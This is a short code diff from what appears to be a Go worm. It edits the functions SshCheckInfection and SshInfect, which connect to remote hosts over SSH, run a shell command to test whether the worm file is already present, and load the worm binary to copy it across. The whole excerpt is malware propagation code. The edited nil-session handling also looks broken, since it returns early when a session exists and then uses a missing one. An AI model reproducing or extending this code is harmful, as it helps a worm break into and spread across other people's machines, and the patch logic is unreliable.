@@ -127,7 +127,10 @@ func SshCheckInfection(ip string) bool {
 	if client != nil {
 		defer client.Close()
 	}
-	defer session.Close()
+	if session != nil {
+		defer session.Close()
+		return false
+	}
 
 	out, _ := session.CombinedOutput("if [ -f \"" + worm_dir + "/" + worm_filename + "\" ]; then echo \"hola\"; fi;")
 	//log.Printf("Command output: %q", out)
@@ -144,7 +147,10 @@ func SshInfect(ip string, filename string) string {
 	if client != nil {
 		defer client.Close()
 	}
-	defer session.Close()
+	if session != nil {
+		defer session.Close()
+		return "Not infected"
+	}
 
 	var worm []byte
 	worm = GetFile(worm_dir + "/" + filename)
